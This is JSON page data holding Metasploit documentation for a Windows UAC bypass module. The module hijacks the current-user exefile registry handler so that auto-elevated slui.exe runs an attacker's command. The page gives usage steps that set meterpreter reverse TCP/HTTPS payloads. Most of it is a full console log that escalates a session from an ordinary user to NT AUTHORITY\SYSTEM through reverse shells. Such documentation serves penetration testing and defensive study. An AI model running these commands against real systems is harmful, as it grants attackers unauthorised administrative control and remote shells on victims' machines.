{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/bypassuac_sluihijack","result":{"data":{"moduleMetadataJson":{"id":"173adfff-b120-5018-8a93-c2a58c3b8861","name":"Windows UAC Protection Bypass (Via Slui File Handler Hijack)","fullname":"exploit/windows/local/bypassuac_sluihijack","description":"This module will bypass UAC on Windows 8-10 by hijacking a special key in the Registry under\n          the Current User hive, and inserting a custom command that will get invoked when any binary\n          (.exe) application is launched. But slui.exe is an auto-elevated binary that is vulnerable\n          to file handler hijacking. When we run slui.exe with changed Registry key\n          (HKCU:\\Software\\Classes\\exefile\\shell\\open\\command), it will run our custom command as Admin\n          instead of slui.exe.\n\n          The module modifies the registry in order for this exploit to work. The modification is\n          reverted once the exploitation attempt has finished.\n\n          The module does not require the architecture of the payload to match the OS. If\n          specifying EXE::Custom your DLL should call ExitProcess() after starting the\n          payload in a different process.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/bypassuac_sluihijack","documentationSlug":"/modules/documentation/exploit/windows/local/bypassuac_sluihijack"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>  This module will bypass UAC on Windows 8-10 by hijacking a special key in the Registry under\nthe Current User hive, and inserting a custom command that will get invoked when\nany binary (.exe) application is launched. But slui.exe is an auto-elevated binary that is\nvulnerable to file handler hijacking. When we run slui.exe with changed Registry key\n(HKCU:\\Software\\Classes\\exefile\\shell\\open\\command), it will run our custom command as Admin\ninstead of slui.exe.</p>\n<p>  The module modifies the registry in order for this exploit to work. The modification is\nreverted once the exploitation attempt has finished.</p>\n<p>  The module does not require the architecture of the payload to match the OS. If\nspecifying EXE::Custom your DLL should call ExitProcess() after starting the\npayload in a different process.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<ol>\n<li>First we need to obtain a session on the target system.</li>\n<li>Load module: <code class=\"language-text\">use exploit/windows/local/bypassuac_sluihijack</code></li>\n<li>Set the <code class=\"language-text\">payload</code>: <code class=\"language-text\">set payload windows/x64/meterpreter/reverse_tcp</code></li>\n<li>If an existing handler is configured to receive the elevated session,\nthen the module's handler should be disabled: <code class=\"language-text\">set DisablePayloadHandler true</code>.</li>\n<li>Configure the <code class=\"language-text\">payload</code>.</li>\n<li><code class=\"language-text\">Exploit</code> it.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(multi/handler) &gt; \n[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: d4iywkip) Encoded stage with x86/shikata_ga_nai\n[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: d4iywkip) Staging x86 payload (180854 bytes) ...\n[*] Meterpreter session 1 opened (192.168.0.30:443 -&gt; 192.168.0.33:49875) at 2018-04-07 18:33:11 +0200\n\nmsf exploit(multi/handler) &gt; sessions \n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                 Connection\n  --  ----  ----                     -----------                 ----------\n  1         meterpreter x86/windows  WIN10-01\\user01 @ WIN10-01  192.168.0.30:443 -&gt; 192.168.0.33:49875 (192.168.0.33)\n\nmsf exploit(multi/handler) &gt; sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo \nComputer        : WIN10-01\nOS              : Windows 10 (Build 16299).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; getuid \nServer username: WIN10-01\\user01\nmeterpreter &gt; getprivs \n\nEnabled Process Privileges\n==========================\n\nName\n----\nSeChangeNotifyPrivilege\nSeIncreaseWorkingSetPrivilege\nSeShutdownPrivilege\nSeTimeZonePrivilege\nSeUndockPrivilege\n\nmeterpreter &gt; background \n[*] Backgrounding session 1...\nmsf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac_sluihijack\nmsf exploit(windows/local/bypassuac_sluihijack) &gt; show targets \n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Windows x86\n   1   Windows x64\n\n\nmsf exploit(windows/local/bypassuac_sluihijack) &gt; set target 1\ntarget =&gt; 1\nmsf exploit(windows/local/bypassuac_sluihijack) &gt; set payload windows/x64/meterpreter/reverse_https\npayload =&gt; windows/x64/meterpreter/reverse_https\nmsf exploit(windows/local/bypassuac_sluihijack) &gt; set session 1\nsession =&gt; 1\nmsf exploit(windows/local/bypassuac_sluihijack) &gt; set LHOST 192.168.0.30\nLHOST =&gt; 192.168.0.30\nmsf exploit(windows/local/bypassuac_sluihijack) &gt; exploit \n\n[*] Started HTTPS reverse handler on https://192.168.0.30:8443\n[*] UAC is Enabled, checking level...\n[+] Part of Administrators group! Continuing...\n[+] UAC is set to Default\n[+] BypassUAC can bypass this setting, continuing...\n[*] Configuring payload and stager registry keys ...\n[*] Executing payload: C:\\Windows\\Sysnative\\cmd.exe /c powershell Start-Process C:\\Windows\\System32\\slui.exe -Verb runas\n[*] https://192.168.0.30:8443 handling request from 192.168.0.33; (UUID: znqja6ua) Staging x64 payload (207449 bytes) ...\n[*] Meterpreter session 2 opened (192.168.0.30:8443 -&gt; 192.168.0.33:49881) at 2018-04-07 18:34:39 +0200\n[*] Cleaining up registry keys ...\n\nmeterpreter &gt; getprivs \n\nEnabled Process Privileges\n==========================\n\nName\n----\nSeBackupPrivilege\nSeChangeNotifyPrivilege\nSeCreateGlobalPrivilege\nSeCreatePagefilePrivilege\nSeCreateSymbolicLinkPrivilege\nSeDebugPrivilege\nSeImpersonatePrivilege\nSeIncreaseBasePriorityPrivilege\nSeIncreaseQuotaPrivilege\nSeIncreaseWorkingSetPrivilege\nSeLoadDriverPrivilege\nSeManageVolumePrivilege\nSeProfileSingleProcessPrivilege\nSeRemoteShutdownPrivilege\nSeRestorePrivilege\nSeSecurityPrivilege\nSeShutdownPrivilege\nSeSystemEnvironmentPrivilege\nSeSystemProfilePrivilege\nSeSystemtimePrivilege\nSeTakeOwnershipPrivilege\nSeTimeZonePrivilege\nSeUndockPrivilege\n\nmeterpreter &gt; getsystem \n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter &gt; getuid \nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"173adfff-b120-5018-8a93-c2a58c3b8861"}}}